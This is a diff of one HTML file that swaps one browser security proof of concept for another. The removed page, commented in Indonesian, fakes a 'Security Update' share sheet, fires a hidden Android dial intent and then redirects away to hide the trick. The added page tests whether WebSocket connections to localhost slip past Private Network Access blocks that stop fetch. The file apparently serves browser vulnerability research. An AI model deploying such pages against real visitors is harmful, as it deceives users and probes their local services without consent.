@@ -1,65 +1,89 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>S Y S T 3 M</title>
-    <style>
-        body, html { 
-            margin: 0; padding: 0; background: #000; 
-            width: 100vw; height: 100vh; overflow: hidden;
-        }
-        #trigger {
-            width: 100%; height: 100%; cursor: pointer;
-        }
-    </style>
+<meta charset="utf-8">
+<title>PNA Inconsistency Test</title>
 </head>
-<body>
-
-    <div id="trigger"></div>
+<body style="font-family:monospace;">
+<h2>PNA Inconsistency Test (Fetch vs WebSocket)</h2>
+<pre id="log"></pre>
 
 <script>
-    const trigger = document.getElementById('trigger');
+const logEl = document.getElementById("log");
+const log = (msg) => logEl.textContent += msg + "\n";
 
-    trigger.addEventListener('touchstart', async function() {
-        // 1. Fullscreen Lockdown
-        if (document.documentElement.requestFullscreen) {
-            document.documentElement.requestFullscreen();
+const TARGET = "127.0.0.1:3000";
+
+// --- TEST 1: FETCH ---
+async function testFetch() {
+    log("=== FETCH TEST ===");
+    try {
+        const res = await fetch(`http://${TARGET}`, {
+            mode: "cors"
+        });
+        log("[FETCH] SUCCESS (unexpected if PNA enforced)");
+    } catch (e) {
+        log("[FETCH] BLOCKED (expected PNA behavior)");
+        log("Error: " + e.message);
+    }
+}
+
+// --- TEST 2: WEBSOCKET ---
+function testWebSocket() {
+    return new Promise((resolve) => {
+        log("\n=== WEBSOCKET TEST ===");
+
+        let ws;
+        try {
+            ws = new WebSocket(`ws://${TARGET}`);
+        } catch (e) {
+            log("[WS] INIT ERROR: " + e.message);
+            resolve();
+            return;
         }
 
-        // 2. Persiapkan Intent URL
-        const intentUrl = "intent://123456789#Intent;scheme=tel;action=android.intent.action.DIAL;end";
+        let connected = false;
 
-        // 3. Picu Web Share API (Memaksa System UI Muncul)
-        // Ini akan membingungkan urutan render pada Android
-        if (navigator.share) {
-            navigator.share({
-                title: 'Security Update',
-                text: 'System requires verification',
-                url: 'https://support.mozilla.org'
-            }).catch(() => {}); // Abaikan jika user cancel
-        }
+        ws.onopen = () => {
+            connected = true;
+            log("[WS] CONNECTED (POTENTIAL PNA BYPASS)");
+            ws.send("ping");
+            ws.close();
+        };
 
-        // 4. Picu Intent via Iframe tepat saat Share Sheet sedang memuat
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = intentUrl;
-        document.body.appendChild(iframe);
-
-        // 5. Cadangan Pemicu Intent
-        setTimeout(() => {
-            window.location.href = intentUrl;
-        }, 150);
-
-        // 6. STEALTH REDIRECT (The "Ghost" Exit)
-        // Redirect dilakukan saat System Share Sheet mungkin masih aktif
-        setTimeout(() => {
-            if (document.exitFullscreen) {
-                document.exitFullscreen();
+        ws.onerror = () => {
+            if (!connected) {
+                log("[WS] BLOCKED (expected if protected)");
             }
-            window.location.replace("https://www.google.com");
-        }, 800);
+        };
+
+        ws.onclose = () => {
+            log("[WS] CLOSED");
+            resolve();
+        };
+
+        // timeout safety
+        setTimeout(() => {
+            if (!connected) {
+                log("[WS] TIMEOUT (likely blocked)");
+                resolve();
+            }
+        }, 3000);
     });
+}
+
+// --- RUN TEST ---
+(async () => {
+    log("Target: " + TARGET);
+    log("Origin: " + location.origin);
+    log("Starting tests...\n");
+
+    await testFetch();
+    await testWebSocket();
+
+    log("\n=== RESULT ===");
+    log("If FETCH = blocked AND WS = connected => INCONSISTENCY");
+})();
 </script>
 </body>
 </html>
